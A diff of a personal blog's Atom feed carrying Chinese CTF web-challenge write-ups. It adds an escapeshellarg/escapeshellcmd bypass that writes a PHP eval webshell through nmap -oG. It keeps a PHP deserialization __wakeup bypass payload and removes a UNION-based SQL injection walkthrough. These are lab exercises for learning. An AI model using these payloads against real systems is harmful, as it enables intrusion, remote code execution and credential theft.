@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://lingxin16.github.io/"/>
-  <updated>2020-07-14T02:50:13.888Z</updated>
+  <updated>2020-07-15T07:58:55.916Z</updated>
   <id>http://lingxin16.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>BUUCTF2018-OnlineTool</title>
+    <link href="http://lingxin16.github.io/2020/07/15/BUUCTF2018-OnlineTool/"/>
+    <id>http://lingxin16.github.io/2020/07/15/BUUCTF2018-OnlineTool/</id>
+    <published>2020-07-15T01:19:11.000Z</published>
+    <updated>2020-07-15T07:58:55.916Z</updated>
+    
+    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p><img src="/2020/07/15/BUUCTF2018-OnlineTool/1.png" alt="1"></p><p>总体意思就是GET方式传递参数给host然后经过两个函数<code>escapeshellarg</code>和<code>escapeshellcmd</code>，最后执行<code>system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host)</code></p><p><img src="/2020/07/15/BUUCTF2018-OnlineTool/2.png" alt="2"></p><p>函数作用</p><pre><code>1,确保用户值传递一个参数给命令2,用户不能指定更多的参数3,用户不能执行不同的命令</code></pre><p><img src="/2020/07/15/BUUCTF2018-OnlineTool/3.png" alt="3"></p><p>函数作用</p><pre><code>1,确保用户只执行一个命令2,用户可以指定不限数量的参数3,用户不能执行不同的命令</code></pre><p>题目提示给了PHP和RCE</p><p><img src="/2020/07/15/BUUCTF2018-OnlineTool/4.png" alt="4"></p><p>这里关于PHP escapeshellarg()+escapeshellcmd()的RCE漏洞https:/<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener"></a>/paper.seebug.org/164/</p><ol><li>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code></li><li>经过<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li><li>经过<code>escapeshellcmd</code>处理后变成<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个<strong>不配对儿</strong>的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.escapeshellcmd.php</a></li><li>最后执行的命令是<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\</code>发起请求，POST 数据为<code>a=1&#39;</code>。</li></ol><p>接下来就是构造命令</p><pre><code>?host=&#39; &lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; -oG shell.php &#39;</code></pre><p><img src="/2020/07/15/BUUCTF2018-OnlineTool/5.png" alt="5"></p><p>文件路径/c42a72d0bb829f75f501621acb75dc05/shell.php</p><p>蚁剑连接后在根目录找到flag</p><p>nmap中文手册：<a href="http://www.nmap.com.cn/doc/manual.shtm" target="_blank" rel="noopener">http://www.nmap.com.cn/doc/manual.shtm</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
+    
+      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
+    
+  </entry>
   
   <entry>
     <title>RoarCTF2019-EasyJava</title>
@@ -436,29 +459,6 @@
     <updated>2020-06-12T15:17:09.035Z</updated>
     
     <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/1.png" alt="1"></p><p>描述中说有备份网站的习惯，尝试常见的网站备份地址，发现<a href="http://www.zip文件存在" target="_blank" rel="noopener">www.zip文件存在</a></p><p>下载解压，发现存在五个文件</p><p><img src="/2020/06/12/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-PHP/2.png" alt="2"></p><p>其中三个PHP文件代码分别为</p><p>index.php</p><pre><code class="php+HTML">&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;I have a cat!&lt;/title&gt;  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;&gt;      &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;&lt;/head&gt;&lt;style&gt;    #login{           position: absolute;           top: 50%;           left:50%;           margin: -150px 0 0 -150px;           width: 300px;           height: 300px;       }       h4{           font-size: 2em;           margin: 0.67em 0;       }&lt;/style&gt;&lt;body&gt;```index.php&lt;!DOCTYPE html&gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;title&gt;I have a cat!&lt;/title&gt;  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;&gt;      &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;&lt;/head&gt;&lt;style&gt;    #login{           position: absolute;           top: 50%;           left:50%;           margin: -150px 0 0 -150px;           width: 300px;           height: 300px;       }       h4{           font-size: 2em;           margin: 0.67em 0;       }&lt;/style&gt;&lt;body&gt;&lt;div id=&quot;world&quot;&gt;    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;&gt;因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯    &lt;/div&gt;    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;&gt;不愧是我！！！    &lt;/div&gt;    &lt;div style=&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;&gt;    &lt;?php    include &#39;class.php&#39;;    $select = $_GET[&#39;select&#39;];    $res=unserialize(@$select);    ?&gt;    &lt;/div&gt;    &lt;div style=&quot;position: absolute;bottom: 5%;width: 99%;&quot;&gt;&lt;p align=&quot;center&quot; style=&quot;font:italic 15px Georgia,serif;color:white;&quot;&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;script src=&#39;http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js&#39;&gt;&lt;/script&gt;&lt;script src=&#39;http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js&#39;&gt;&lt;/script&gt;&lt;script src=&#39;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js&#39;&gt;&lt;/script&gt;&lt;script src=&#39;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js&#39;&gt;&lt;/script&gt;&lt;script  src=&quot;index.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>class.php</p><pre><code class="PHP">&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }    function __wakeup(){        $this-&gt;username = &#39;guest&#39;;    }    function __destruct(){        if ($this-&gt;password != 100) {            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        }        if ($this-&gt;username === &#39;admin&#39;) {            global $flag;            echo $flag;        }else{            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        }    }}?&gt;</code></pre><p>flag.php</p><pre><code class="php">&lt;?php$flag = &#39;Syc{dog_dog_dog_dog}&#39;;?&gt;</code></pre><p>可以看到在index.php中包含了class.php 代码如下</p><pre><code class="PHP">&lt;?php    include &#39;class.php&#39;;    $select = $_GET[&#39;select&#39;];    $res=unserialize(@$select);    ?&gt;</code></pre><p>从这几行代码中，推断与反序列化有关</p><p>然后看class.php几个关键函数</p><pre><code>__construct构造函数__wakeup函数__destruct析构函数</code></pre><p>关于__wakeup函数的漏洞，参考<a href>wakeup()函数漏洞以及实际漏洞分析</a></p><p><code>__wakeup()</code>漏洞，简要来说就是当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过<code>__wakeup()</code>的执行</p><p>这里我们需要构造username等于admin和password等于100来echo flag</p><pre><code class="PHP">&lt;?phpclass Name{    private $username = &#39;admin&#39;;    private $password = &#39;100&#39;;}$a = new Name();echo serialize($a);?&gt;</code></pre><p>得到O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;s:3:”100”;}</p><p>为了绕过<code>__wakeup()</code> 我们将2改为3</p><p>得到O:4:”Name”:3:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;s:3:”100”;}</p><p>然后关于private声明变量</p><p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中 \0 字符也是计算长度的。</p><p>因此我们在类名和字段名前面加上\0的前缀，而\0 在url栏中会出现空白符，复制的时候丢失，所以我们加上%00</p><p>最后得到payload</p><pre><code>?select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
-    
-      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>极客大挑战2019-LoveSQL</title>
-    <link href="http://lingxin16.github.io/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/"/>
-    <id>http://lingxin16.github.io/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/</id>
-    <published>2020-06-11T13:56:16.000Z</published>
-    <updated>2020-06-11T14:38:55.698Z</updated>
-    
-    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目  熟悉的界面</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/1.png" alt="1"></p><p>有一行红字用 sqlmap 是没有灵魂的 用sqlmap跑一下，但是失败了</p><p>还是手动吧   用万能密码登录得到</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/2.png" alt="2"></p><p>登陆成功，并提示密码，密码尝试用md5爆破无果</p><p>然后就是普通的sql注入了..</p><p>username=1’order by 1#</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/3.png" alt="3"></p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/4.png" alt="4"></p><p>username=1’order by 4#的时候出现Unknown column ‘4’ in ‘order clause’</p><p>说明总共有三个字段</p><p>username=1’union select 1,2,3 #</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/5.png" alt="5"></p><p>得到回显点2和3</p><p>username=1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/6.png" alt="6"></p><p>得到两个表geekuser和l0ve1ysq1</p><p>username=1’union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’geekuser’#</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/7.png" alt="7"></p><p>得到三个字段id，username和password</p><p>爆破这三个字段</p><p>username=1’union select 1,group_concat(id,username,password),3 from geekuser#</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/8.png" alt="8"></p><p>没有flag</p><p>接下来换l0ve1ysq1表 </p><p>username=1’union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’l0ve1ysq1’#</p><p>得到一样的三个字段 </p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/9.png" alt="9"></p><p>爆破这三个字段</p><p>1’union select 1,group_concat(id,username,password),3 from l0ve1ysq1#</p><p>得到flag</p><p><img src="/2020/06/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-LoveSQL/10.png" alt="10"></p>]]></content>
     
     <summary type="html">
     
